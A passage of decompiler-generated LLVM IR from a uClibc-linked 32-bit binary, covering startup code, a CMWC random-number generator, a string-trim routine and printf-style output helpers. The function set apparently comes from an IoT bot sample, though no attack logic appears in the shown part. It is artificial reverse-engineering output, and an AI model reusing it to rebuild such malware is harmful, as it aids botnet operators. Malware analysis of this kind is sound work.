  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80584a0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8058024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80584a0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_8057504.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_8058010.6, align 16
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134532009, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134562728, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_80584e0.7, align 32
  %v1_8048199 = add i32 %arg1, -1640531527
  store i32 %v1_8048199, i32* @global_var_80584e4.8, align 4
  %v1_80481a6 = add i32 %arg1, 1013904242
  store i32 %v1_80481a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80481a6, i32* @global_var_80584e8.9, align 8
  br label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %entry, %dec_label_pc_80481b9
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481e9, %dec_label_pc_80481b9 ]
  %v1_80481bf = add nsw i32 %storemerge5, -3
  store i32 %v1_80481bf, i32* %eax.global-to-local, align 4
  %v1_80481c2 = mul nuw nsw i32 %v1_80481bf, 4
  %v2_80481c2 = add i32 %v1_80481c2, ptrtoint (i32* @global_var_80584e0.7 to i32)
  %v3_80481c2 = inttoptr i32 %v2_80481c2 to i32*
  %v4_80481c2 = load i32, i32* %v3_80481c2, align 4
  %v1_80481cc = add nsw i32 %storemerge5, -2
  store i32 %v1_80481cc, i32* %eax.global-to-local, align 4
  %v1_80481cf = mul nuw nsw i32 %v1_80481cc, 4
  %v2_80481cf = add i32 %v1_80481cf, ptrtoint (i32* @global_var_80584e0.7 to i32)
  %v3_80481cf = inttoptr i32 %v2_80481cf to i32*
  %v4_80481cf = load i32, i32* %v3_80481cf, align 4
  %v2_80481d6 = xor i32 %v4_80481cf, %v4_80481c2
  %v2_80481db = xor i32 %storemerge5, -1640531527
  %v1_80481dd = xor i32 %v2_80481db, %v2_80481d6
  store i32 %v1_80481dd, i32* %eax.global-to-local, align 4
  %v2_80481e2 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e2 = add i32 %v2_80481e2, ptrtoint (i32* @global_var_80584e0.7 to i32)
  %v4_80481e2 = inttoptr i32 %v3_80481e2 to i32*
  store i32 %v1_80481dd, i32* %v4_80481e2, align 4
  %v4_80481e9 = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481e9, 4096
  br i1 %exitcond, label %dec_label_pc_80481f5, label %dec_label_pc_80481b9

dec_label_pc_80481f5:                             ; preds = %dec_label_pc_80481b9
  %v0_80481f6 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481f6

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481b9, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048213 = load i32, i32* @global_var_8058210.10, align 16
  %v1_8048218 = add i32 %v0_8048213, 1
  %v1_8048219 = urem i32 %v1_8048218, 4096
  store i32 %v1_8048219, i32* @global_var_8058210.10, align 16
  %v1_8048228 = mul nuw nsw i32 %v1_8048219, 4
  %v2_8048228 = add i32 %v1_8048228, ptrtoint (i32* @global_var_80584e0.7 to i32)
  %v3_8048228 = inttoptr i32 %v2_8048228 to i32*
  %v4_8048228 = load i32, i32* %v3_8048228, align 4
  %v7_8048245 = udiv i32 %v4_8048228, 228675
  store i32 %v7_8048245, i32* @global_var_805820c.11, align 4
  br i1 true, label %dec_label_pc_8048295, label %dec_label_pc_8048287

dec_label_pc_8048287:                             ; preds = %entry
  br label %dec_label_pc_8048295

dec_label_pc_8048295:                             ; preds = %entry, %dec_label_pc_8048287
  store i32 %v1_8048219, i32* @ecx, align 4
  %v1_80482aa = mul nuw nsw i32 %v1_8048219, 4
  %v2_80482aa = add i32 %v1_80482aa, ptrtoint (i32* @global_var_80584e0.7 to i32)
  %v3_80482aa = inttoptr i32 %v2_80482aa to i32*
  %v4_80482aa = load i32, i32* %v3_80482aa, align 4
  ret i32 %v4_80482aa

; uselistorder directives
  uselistorder i32 %v1_8048219, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8048295, { 1, 0 }
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp10 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_80482ba = load i32, i32* @edi, align 4
  store i32 %v0_80482ba, i32* %stack_var_-8, align 4
  %v4_80482c5 = ptrtoint i8* %tmp10 to i32
  store i1 false, i1* @df, align 1
  %v3_80482d6 = call i32 @_strlen(i8* %tmp10)
  %v1_80482dd = add i32 %v3_80482d6, -1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e3:                             ; preds = %dec_label_pc_80482e6
  %v4_80482e3 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e6:                             ; preds = %entry, %dec_label_pc_80482e3
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e3, %dec_label_pc_80482e3 ]
  %v6_80482e9 = add i32 %stack_var_-16.0, %v4_80482c5
  %v1_80482ec = inttoptr i32 %v6_80482e9 to i8*
  %v2_80482ec = load i8, i8* %v1_80482ec, align 1
  %v2_80482ee = sext i8 %v2_80482ec to i32
  %v1_80482f5 = call i32 @isspace(i32 %v2_80482ee)
  %v1_80482fd = icmp eq i32 %v1_80482f5, 0
  %v1_80482ff = icmp eq i1 %v1_80482fd, false
  br i1 %v1_80482ff, label %dec_label_pc_80482e3, label %dec_label_pc_8048306.preheader

dec_label_pc_8048306.preheader:                   ; preds = %dec_label_pc_80482e6
  %v5_804830c24 = icmp slt i32 %v1_80482dd, %stack_var_-16.0
  br i1 %v5_804830c24, label %dec_label_pc_8048329, label %dec_label_pc_804830e.lr.ph

dec_label_pc_804830e.lr.ph:                       ; preds = %dec_label_pc_8048306.preheader
  br label %dec_label_pc_804830e

dec_label_pc_8048303:                             ; preds = %dec_label_pc_804830e
  %v5_8048303 = add i32 %stack_var_-12.0.in25, -1
  %v5_804830c = icmp slt i32 %v5_8048303, %stack_var_-16.0
  br i1 %v5_804830c, label %dec_label_pc_8048329, label %dec_label_pc_804830e

dec_label_pc_804830e:                             ; preds = %dec_label_pc_804830e.lr.ph, %dec_label_pc_8048303
  %stack_var_-12.0.in25 = phi i32 [ %v1_80482dd, %dec_label_pc_804830e.lr.ph ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v6_8048311 = add i32 %stack_var_-12.0.in25, %v4_80482c5
  %v1_8048314 = inttoptr i32 %v6_8048311 to i8*
  %v2_8048314 = load i8, i8* %v1_8048314, align 1
  %v2_8048316 = sext i8 %v2_8048314 to i32
  %v1_804831d = call i32 @isspace(i32 %v2_8048316)
  %v1_8048325 = icmp eq i32 %v1_804831d, 0
  %v1_8048327 = icmp eq i1 %v1_8048325, false
  br i1 %v1_8048327, label %dec_label_pc_8048303, label %dec_label_pc_8048329

dec_label_pc_8048329:                             ; preds = %dec_label_pc_8048303, %dec_label_pc_804830e, %dec_label_pc_8048306.preheader
  %stack_var_-12.0.in.lcssa = phi i32 [ %v1_80482dd, %dec_label_pc_8048306.preheader ], [ %stack_var_-12.0.in25, %dec_label_pc_804830e ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v7_804835118 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.in.lcssa
  br i1 %v7_804835118, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048331:                             ; preds = %dec_label_pc_8048329, %dec_label_pc_8048331
  %v6_804835b20 = phi i32 [ %v6_804835b, %dec_label_pc_8048331 ], [ %v4_80482c5, %dec_label_pc_8048329 ]
  %storemerge.in19 = phi i32 [ %v5_8048348, %dec_label_pc_8048331 ], [ %stack_var_-16.0, %dec_label_pc_8048329 ]
  %v6_8048341 = add i32 %storemerge.in19, %v4_80482c5
  %v1_8048344 = inttoptr i32 %v6_8048341 to i8*
  %v2_8048344 = load i8, i8* %v1_8048344, align 1
  %v3_8048346 = inttoptr i32 %v6_804835b20 to i8*
  store i8 %v2_8048344, i8* %v3_8048346, align 1
  %v5_8048348 = add i32 %storemerge.in19, 1
  %v7_8048351 = icmp sgt i32 %v5_8048348, %stack_var_-12.0.in.lcssa
  %v2_8048359 = sub i32 %v5_8048348, %stack_var_-16.0
  %v6_804835b = add i32 %v2_8048359, %v4_80482c5
  br i1 %v7_8048351, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048353:                             ; preds = %dec_label_pc_8048331, %dec_label_pc_8048329
  %v6_804835b.lcssa = phi i32 [ %v4_80482c5, %dec_label_pc_8048329 ], [ %v6_804835b, %dec_label_pc_8048331 ]
  %v22_804835b = inttoptr i32 %v6_804835b.lcssa to i8*
  store i8 0, i8* %v22_804835b, align 1
  %v3_8048361 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048361, i32* @edi, align 4
  ret i32 %v6_804835b.lcssa

; uselistorder directives
  uselistorder i32 %v6_804835b.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048348, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.in.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.in25, { 0, 2, 1 }
  uselistorder i32 %v5_8048303, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v1_80482dd, { 2, 1, 0 }
  uselistorder i32 %v4_80482c5, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %tmp10, { 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8048331, { 1, 0 }
  uselistorder label %dec_label_pc_8048329, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830e, { 1, 0 }
  uselistorder label %dec_label_pc_80482e6, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_804839e

dec_label_pc_804838b:                             ; preds = %entry
  %v3_8048396 = bitcast i8* %stack_var_8 to i32*
  %v4_8048396 = call i32 @__libc_write(i32 1, i32* %v3_8048396, i32 1)
  br label %dec_label_pc_804839e

dec_label_pc_804839e:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_804839f = phi i32 [ %tmp3, %dec_label_pc_8048372 ], [ %v4_8048396, %dec_label_pc_804838b ]
  ret i32 %v0_804839f

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804839e, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp24 = icmp slt i32 %arg3, 1
  br i1 %tmp24, label %dec_label_pc_8048400, label %dec_label_pc_80483ba

dec_label_pc_80483ba:                             ; preds = %entry
  %v4_80483c1 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c1, i32* @edx, align 4
  %v2_80483d255 = load i8, i8* %arg2, align 1
  %v3_80483d256 = zext i8 %v2_80483d255 to i32
  %v5_80483d257 = and i32 %v4_80483c1, -256
  %v6_80483d258 = or i32 %v3_80483d256, %v5_80483d257
  %v4_80483d459 = icmp eq i8 %v2_80483d255, 0
  %v1_80483d660 = icmp eq i1 %v4_80483d459, false
  br i1 %v1_80483d660, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483c9:                             ; preds = %dec_label_pc_80483ba, %dec_label_pc_80483c9
  %v6_80483d263 = phi i32 [ %v6_80483d2, %dec_label_pc_80483c9 ], [ %v6_80483d258, %dec_label_pc_80483ba ]
  %v4_80483cf62 = phi i32 [ %v5_80483cc, %dec_label_pc_80483c9 ], [ %v4_80483c1, %dec_label_pc_80483ba ]
  %stack_var_-12.061 = phi i32 [ %v4_80483c9, %dec_label_pc_80483c9 ], [ 0, %dec_label_pc_80483ba ]
  %v4_80483c9 = add i32 %stack_var_-12.061, 1
  %v5_80483cc = add i32 %v4_80483cf62, 1
  %v22_80483cc = inttoptr i32 %v5_80483cc to i8*
  store i32 %v5_80483cc, i32* @edx, align 4
  %v2_80483d2 = load i8, i8* %v22_80483cc, align 1
  %v3_80483d2 = zext i8 %v2_80483d2 to i32
  %v5_80483d2 = and i32 %v6_80483d263, -256
  %v6_80483d2 = or i32 %v3_80483d2, %v5_80483d2
  %v4_80483d4 = icmp eq i8 %v2_80483d2, 0
  %v1_80483d6 = icmp eq i1 %v4_80483d4, false
  br i1 %v1_80483d6, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483d8:                             ; preds = %dec_label_pc_80483c9, %dec_label_pc_80483ba
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483ba ], [ %v4_80483c9, %dec_label_pc_80483c9 ]
  %v5_80483de = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483de, label %dec_label_pc_80483e9, label %dec_label_pc_80483ef

dec_label_pc_80483e9:                             ; preds = %dec_label_pc_80483d8
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483ec = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483ef

dec_label_pc_80483ef:                             ; preds = %dec_label_pc_80483d8, %dec_label_pc_80483e9
  %storemerge = phi i32 [ %v5_80483ec, %dec_label_pc_80483e9 ], [ 0, %dec_label_pc_80483d8 ]
  %v1_80483f2 = and i32 %arg4, 2
  %tmp25 = mul nuw nsw i32 %v1_80483f2, 8
  %tmp26 = or i32 %tmp25, 32
  br label %dec_label_pc_8048400

dec_label_pc_8048400:                             ; preds = %dec_label_pc_80483ef, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483ef ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp26, %dec_label_pc_80483ef ]
  %v1_8048403 = urem i32 %arg4, 2
  %v2_8048403 = icmp eq i32 %v1_8048403, 0
  %v1_8048408 = icmp eq i1 %v2_8048403, false
  %.pre10 = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048408, label %dec_label_pc_804844a.preheader, label %dec_label_pc_8048423.preheader

dec_label_pc_8048423.preheader:                   ; preds = %dec_label_pc_8048400
  %tmp2748 = icmp slt i32 %stack_var_12.0, 1
  %tmp2849 = icmp eq i1 %tmp2748, false
  br i1 %tmp2849, label %dec_label_pc_804840c.lr.ph, label %dec_label_pc_804844a.preheader

dec_label_pc_804840c.lr.ph:                       ; preds = %dec_label_pc_8048423.preheader
  br label %dec_label_pc_804840c

dec_label_pc_804840c:                             ; preds = %dec_label_pc_804840c.lr.ph, %dec_label_pc_804840c
  %stack_var_-20.051 = phi i32 [ 0, %dec_label_pc_804840c.lr.ph ], [ %v4_804841d, %dec_label_pc_804840c ]
  %stack_var_12.150 = phi i32 [ %stack_var_12.0, %dec_label_pc_804840c.lr.ph ], [ %v4_8048420, %dec_label_pc_804840c ]
  %v3_8048415 = call i32 @printchar(i32* %.pre10, i32 %stack_var_-16.0)
  %v4_804841d = add i32 %stack_var_-20.051, 1
  %v4_8048420 = add i32 %stack_var_12.150, -1
  %tmp27 = icmp slt i32 %v4_8048420, 1
  %tmp28 = icmp eq i1 %tmp27, false
  br i1 %tmp28, label %dec_label_pc_804840c, label %dec_label_pc_804844a.preheader

dec_label_pc_804844a.preheader:                   ; preds = %dec_label_pc_8048423.preheader, %dec_label_pc_804840c, %dec_label_pc_8048400
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048400 ], [ %stack_var_12.0, %dec_label_pc_8048423.preheader ], [ %v4_8048420, %dec_label_pc_804840c ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048400 ], [ 0, %dec_label_pc_8048423.preheader ], [ %v4_804841d, %dec_label_pc_804840c ]
  %v2_804844d37 = load i8, i8* %arg2, align 1
  %v4_804844f41 = icmp eq i8 %v2_804844d37, 0
  %v1_804845142 = icmp eq i1 %v4_804844f41, false
  br i1 %v1_804845142, label %dec_label_pc_804842b.lr.ph, label %dec_label_pc_804846c.preheader

dec_label_pc_804842b.lr.ph:                       ; preds = %dec_label_pc_804844a.preheader
  %v4_804844a36 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804842b

dec_label_pc_804842b:                             ; preds = %dec_label_pc_804842b.lr.ph, %dec_label_pc_804842b
  %v4_804844a45 = phi i32 [ %v4_804844a36, %dec_label_pc_804842b.lr.ph ], [ %v5_8048447, %dec_label_pc_804842b ]
  %stack_var_-20.144 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804842b.lr.ph ], [ %v4_8048444, %dec_label_pc_804842b ]
  %stack_var_8.043 = phi i8* [ %arg2, %dec_label_pc_804842b.lr.ph ], [ %v22_8048447, %dec_label_pc_804842b ]
  %v2_804842e = load i8, i8* %stack_var_8.043, align 1
  %v3_804842e = zext i8 %v2_804842e to i32
  %v3_804843c = call i32 @printchar(i32* %.pre10, i32 %v3_804842e)
  %v4_8048444 = add i32 %stack_var_-20.144, 1
  %v5_8048447 = add i32 %v4_804844a45, 1
  %v22_8048447 = inttoptr i32 %v5_8048447 to i8*
  %v2_804844d = load i8, i8* %v22_8048447, align 1
  %v4_804844f = icmp eq i8 %v2_804844d, 0
  %v1_8048451 = icmp eq i1 %v4_804844f, false
  br i1 %v1_8048451, label %dec_label_pc_804842b, label %dec_label_pc_804846c.preheader

dec_label_pc_804846c.preheader:                   ; preds = %dec_label_pc_804842b, %dec_label_pc_804844a.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804844a.preheader ], [ %v4_8048444, %dec_label_pc_804842b ]
  %tmp2932 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3033 = icmp eq i1 %tmp2932, false
  br i1 %tmp3033, label %dec_label_pc_8048455.lr.ph, label %dec_label_pc_8048472

dec_label_pc_8048455.lr.ph:                       ; preds = %dec_label_pc_804846c.preheader
  br label %dec_label_pc_8048455

dec_label_pc_8048455:                             ; preds = %dec_label_pc_8048455.lr.ph, %dec_label_pc_8048455
  %stack_var_-20.235 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048455.lr.ph ], [ %v4_8048466, %dec_label_pc_8048455 ]
  %stack_var_12.334 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_8048455.lr.ph ], [ %v4_8048469, %dec_label_pc_8048455 ]
  %v3_804845e = call i32 @printchar(i32* %.pre10, i32 %stack_var_-16.0)
  %v4_8048466 = add i32 %stack_var_-20.235, 1
  %v4_8048469 = add i32 %stack_var_12.334, -1
  %tmp29 = icmp slt i32 %v4_8048469, 1
  %tmp30 = icmp eq i1 %tmp29, false
  br i1 %tmp30, label %dec_label_pc_8048455, label %dec_label_pc_8048472

dec_label_pc_8048472:                             ; preds = %dec_label_pc_8048455, %dec_label_pc_804846c.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804846c.preheader ], [ %v4_8048466, %dec_label_pc_8048455 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048447, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483cc, { 1, 2, 0 }
  uselistorder i32 %v4_80483c1, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_8048455, { 1, 0 }
  uselistorder label %dec_label_pc_804842b, { 1, 0 }
  uselistorder label %dec_label_pc_804844a.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804840c, { 1, 0 }
  uselistorder label %dec_label_pc_80483ef, { 1, 0 }
  uselistorder label %dec_label_pc_80483c9, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804848e = sext i32 %tmp35 to i64
  %v4_8048491 = icmp eq i32 %tmp35, 0
  %v5_8048491 = icmp slt i32 %tmp35, 0
  %v1_8048495 = icmp eq i1 %v4_8048491, false
  br i1 %v1_8048495, label %dec_label_pc_80484bc, label %dec_label_pc_8048497

dec_label_pc_8048497:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484ac = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_8048597

dec_label_pc_80484bc:                             ; preds = %entry
  %v4_80484bc = icmp eq i32 %tmp28, 0
  br i1 %v4_80484bc, label %dec_label_pc_80484dd, label %dec_label_pc_80484c2

dec_label_pc_80484c2:                             ; preds = %dec_label_pc_80484bc
  %v12_80484c2 = icmp eq i32 %tmp27, 10
  %v1_80484c6 = icmp eq i1 %v12_80484c2, false
  br i1 %v1_80484c6, label %dec_label_pc_80484dd, label %dec_label_pc_80484c8

dec_label_pc_80484c8:                             ; preds = %dec_label_pc_80484c2
  %v1_80484cc = icmp eq i1 %v5_8048491, false
  br i1 %v1_80484cc, label %dec_label_pc_80484dd, label %dec_label_pc_80484ce

dec_label_pc_80484ce:                             ; preds = %dec_label_pc_80484c8
  %v1_80484d8 = sub i32 0, %tmp35
  %v5_80484da = sext i32 %v1_80484d8 to i64
  br label %dec_label_pc_80484dd

dec_label_pc_80484dd:                             ; preds = %dec_label_pc_80484c8, %dec_label_pc_80484c2, %dec_label_pc_80484bc, %dec_label_pc_80484ce
  %stack_var_-24.0 = phi i64 [ %v5_804848e, %dec_label_pc_80484bc ], [ %v5_804848e, %dec_label_pc_80484c2 ], [ %v5_804848e, %dec_label_pc_80484c8 ], [ %v5_80484da, %dec_label_pc_80484ce ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484bc ], [ 0, %dec_label_pc_80484c2 ], [ 0, %dec_label_pc_80484c8 ], [ 1, %dec_label_pc_80484ce ]
  %v15_80484e0 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_804853e7 = trunc i64 %stack_var_-24.0 to i32
  %v5_804853e8 = icmp eq i32 %v4_804853e7, 0
  %v1_804854215 = icmp eq i1 %v5_804853e8, false
  br i1 %v1_804854215, label %dec_label_pc_80484ee.lr.ph, label %dec_label_pc_8048544

dec_label_pc_80484ee.lr.ph:                       ; preds = %dec_label_pc_80484dd
  %v5_80484f1 = sext i32 %tmp27 to i64
  br label %dec_label_pc_80484ee

dec_label_pc_80484ee:                             ; preds = %dec_label_pc_80484ee.lr.ph, %dec_label_pc_8048516
  %v3_804851618 = phi i8* [ %tmp48, %dec_label_pc_80484ee.lr.ph ], [ %v22_8048516, %dec_label_pc_8048516 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_80484ee.lr.ph ], [ %v5_804853b, %dec_label_pc_8048516 ]
  %v6_80484fc = and i64 %stack_var_-24.116, 4294967295
  %v12_80484fc = udiv i64 %v6_80484fc, %v5_80484f1
  %v13_80484fc = trunc i64 %v12_80484fc to i32
  %v14_80484fc = urem i64 %v6_80484fc, %v5_80484f1
  %v5_8048501 = trunc i64 %v14_80484fc to i8
  %v7_8048508 = icmp sgt i8 %v5_8048501, 9
  br i1 %v7_8048508, label %dec_label_pc_804850a, label %dec_label_pc_8048516

dec_label_pc_804850a:                             ; preds = %dec_label_pc_80484ee
  %tmp52 = trunc i64 %v14_80484fc to i32
  %v5_804850d = add i32 %tmp52, %tmp
  %v1_8048510 = add i32 %v5_804850d, 198
  %v11_8048510 = trunc i32 %v1_8048510 to i8
  br label %dec_label_pc_8048516

dec_label_pc_8048516:                             ; preds = %dec_label_pc_80484ee, %dec_label_pc_804850a
  %stack_var_-36.0 = phi i8 [ %v11_8048510, %dec_label_pc_804850a ], [ %v5_8048501, %dec_label_pc_80484ee ]
  %v4_8048516 = ptrtoint i8* %v3_804851618 to i32
  %v5_8048516 = add i32 %v4_8048516, -1
  %v22_8048516 = inttoptr i32 %v5_8048516 to i8*
  %v1_804851c = add i8 %stack_var_-36.0, 48
  store i8 %v1_804851c, i8* %v22_8048516, align 1
  %v5_804853b = sext i32 %v13_80484fc to i64
  %v5_804853e = icmp eq i32 %v13_80484fc, 0
  %v1_8048542 = icmp eq i1 %v5_804853e, false
  br i1 %v1_8048542, label %dec_label_pc_80484ee, label %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge

dec_label_pc_804853e.dec_label_pc_8048544_crit_edge: ; preds = %dec_label_pc_8048516
  store i8* %v22_8048516, i8** %stack_var_-40, align 4
  br label %dec_label_pc_8048544

dec_label_pc_8048544:                             ; preds = %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge, %dec_label_pc_80484dd
  %v3_8048581622 = phi i32 [ %v5_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %v15_80484e0, %dec_label_pc_80484dd ]
  %v3_8048572 = phi i8* [ %v22_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %tmp48, %dec_label_pc_80484dd ]
  %v4_8048544 = icmp eq i32 %stack_var_-32.0, 0
